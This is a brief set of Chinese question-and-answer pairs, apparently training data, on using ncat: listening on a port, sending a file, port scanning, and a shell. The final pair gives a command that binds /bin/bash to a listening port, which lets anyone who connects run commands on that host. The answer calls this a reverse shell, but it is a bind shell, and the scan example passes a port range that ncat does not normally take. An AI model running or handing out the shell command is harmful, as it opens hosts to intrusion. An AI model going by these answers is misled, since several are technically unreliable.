# q
如何使用ncat在本地主机上监听端口1234？
# a
```bash
ncat -l 1234
```

# q
如何用ncat将本地文件发送到远程主机的1234端口？
# a
```bash
cat file.txt | ncat 192.168.1.100 1234
```
或者只发送文件使用 `--send-only`：
```bash
ncat --send-only 192.168.1.100 1234 < file.txt
```

# q
如何使用ncat进行一次不发数据的端口扫描？
# a
```bash
ncat -zv 192.168.1.100 1-100
```
`-z` 选项表示扫描但不发送数据，`1-100` 为端口范围。

# q
如何通过ncat建立一个反向shell，让远程主机执行/bin/bash？
# a
在远程主机上监听并绑定shell：
```bash
ncat -lvp 1234 -e /bin/bash
```
然后在本地连接：
```bash
ncat 192.168.1.100 1234
```
连接后即可在本地执行远程命令。

